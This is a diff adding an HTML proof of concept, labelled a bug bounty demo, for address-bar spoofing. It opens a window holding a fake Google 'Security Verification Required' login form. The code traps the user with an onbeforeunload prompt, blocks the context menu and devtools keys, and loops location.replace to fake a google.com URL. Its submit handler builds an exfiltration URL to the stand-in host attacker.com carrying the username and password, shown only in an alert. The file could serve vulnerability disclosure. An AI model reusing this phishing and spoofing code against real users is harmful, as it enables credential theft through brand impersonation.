@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="spoof()">Click to spoof (Bug Bounty Demo)</button>
+
+<script>
+function spoof() {
+    let win = window.open("", "_blank");
+    
+    // Add onbeforeunload handler to prevent easy closure
+    win.onbeforeunload = function(e) {
+        e.preventDefault();
+        // Custom message (note: modern browsers may not display custom messages)
+        e.returnValue = "Are you sure you want to leave? Your login session will be interrupted.";
+        return e.returnValue;
+    };
+
+    let payload = `
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Google</title>
+            <style>
+                body { 
+                    font-family: Arial, sans-serif; 
+                    margin: 0; 
+                    padding: 20px;
+                    background: white;
+                }
+                .container {
+                    max-width: 400px;
+                    margin: 0 auto;
+                    text-align: center;
+                }
+                .warning {
+                    color: red;
+                    font-size: 10px;
+                    margin-top: 30px;
+                    border-top: 1px solid #eee;
+                    padding-top: 10px;
+                }
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" 
+                     alt="Google Logo" style="margin:20px auto; display:block;">
+                <h1>Security Verification Required</h1>
+                <p>Please enter your credentials to continue</p>
+                <form onsubmit="handleSubmit(event)" style="margin-top:20px;">
+                    <input type="text" placeholder="Username" 
+                           style="display:block; margin:10px auto; padding:8px; width:200px;" required>
+                    <input type="password" placeholder="Password" 
+                           style="display:block; margin:10px auto; padding:8px; width:200px;" required>
+                    <button type="submit" 
+                            style="padding:8px 16px; background-color:#4285F4; color:white; border:none; cursor:pointer;">
+                        Sign In
+                    </button>
+                </form>
+                <div class="warning">
+                    ⚠️ DEMO FOR BUG BOUNTY TESTING ONLY ⚠️<br>
+                    No real credentials are collected or stored
+                </div>
+            </div>
+            <script>
+                function handleSubmit(e) {
+                    e.preventDefault();
+                    const inputs = e.target.querySelectorAll('input');
+                    const username = inputs[0].value || 'demo_user';
+                    const password = inputs[1].value || 'demo_pass';
+                    
+                    // Simulate credential collection (NO REAL EXFILTRATION)
+                    console.log('Demo - Credentials entered:', {username, password});
+                    
+                    alert('DEMO: This would send to: https://attacker.com/collect?user=' + 
+                          encodeURIComponent(username) + '&pass=' + encodeURIComponent(password));
+                    
+                    return false;
+                }
+                
+                // Additional protection: prevent context menu
+                document.addEventListener('contextmenu', function(e) {
+                    e.preventDefault();
+                    return false;
+                });
+                
+                // Prevent keyboard shortcuts for dev tools
+                document.addEventListener('keydown', function(e) {
+                    if (e.key === 'F12' || 
+                        (e.ctrlKey && e.shiftKey && e.key === 'I') || 
+                        (e.ctrlKey && e.key === 'u')) {
+                        e.preventDefault();
+                        return false;
+                    }
+                });
+            <\/script>
+        </body>
+        </html>
+    `;
+    
+    win.document.write(payload);
+    win.document.close();
+    
+    // URL spoofing mechanism
+    setInterval(function() {
+        try {
+            win.location.replace("https://www.google.com:8080");
+        } catch(e) {
+            // Handle potential security restrictions
+            console.log("URL replacement blocked:", e);
+        }
+    }, 10);
+    
+    // Additional: Lock focus to the spoofed window
+    try {
+        win.focus();
+    } catch(e) {}
+}
+</script>
+
+<p style="color: red; font-size: 12px; margin-top: 20px;">
+⚠️ FOR AUTHORIZED SECURITY TESTING ONLY ⚠️<br>
+Do not use this technique on systems you don't own or without explicit permission.
+</p>
+
+</body>
+</html>
